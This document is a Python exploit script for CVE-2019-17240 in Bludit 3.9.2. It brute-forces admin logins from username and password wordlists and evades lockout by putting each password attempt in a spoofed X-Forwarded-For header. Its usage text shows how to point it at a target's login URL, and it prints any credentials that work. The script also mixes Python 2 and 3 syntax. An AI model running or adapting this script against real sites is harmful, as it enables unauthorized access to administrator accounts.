#!/usr/bin/env python3
import re
import requests
import getopt
import sys

login_url = ""
usernames_file_list = ""
passwords_file_list = ""
usernames_list = ""
passwords_list = ""
verbose = False

def help():
	print("Bludit 3.9.2 - bruteforce bypass")
	print("https://github.com/LucaReggiannini/Bludit-3-9-2-bb\n")
	print("This script is based on CVE-2019-17240 (https://github.com/bludit/bludit/pull/1090)\n")
	print("usage: python ./bludit-3-9-2-bb.py -l 'http://sitename.com/admin/login' -u ./usernames_file_list.txt -p ./passwords_file_list.txt")
	print("help : python ./bludit-3-9-2-bb.py -h")
	print("verbose mode: add parameter '-v'")
	exit()



try:
	option_value_pair, arguments_left = getopt.getopt(sys.argv[1:], 'vhl:u:p:')
except getopt.GetoptError as error:
        print str(error)

for option, value in option_value_pair:
	if option in ('-h'):
		help()
	elif option in ('-l'):
		login_url = value
	elif option in ('-u'):
		usernames_file_list = value
	elif option in ('-p'):
		passwords_file_list = value
	elif option in ('-v'):
		verbose = True
	else: help()



# Check if main variables are set
if not login_url or not usernames_file_list or not passwords_file_list:
	print("\nError: Incorrect arguments. See this help:\n")
	help()
	

# Start the attack
print("Starting bruteforce...")
for username in (open(usernames_file_list, 'r')).readlines(): 
	for password in (open(passwords_file_list, 'r')).readlines(): 
		if verbose:			
			print('Testing {u}:{p}'.format(u = username.strip(), p = password.strip()))
		session = requests.Session()
		login_page = session.get(login_url)
		csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)

		headers = {
		    'X-Forwarded-For': password.strip(),
		    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
		    'Referer': login_url
		}
		data = {
		    'tokenCSRF': csrf_token,
		    'username': username.strip(),
		    'password': password.strip(),
		    'save': ''
		}
		login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)
		if 'location' in login_result.headers:
		    if '/admin/dashboard' in login_result.headers['location']:
			print('Found {u}:{p}'.format(u = username.strip(), p = password.strip()))


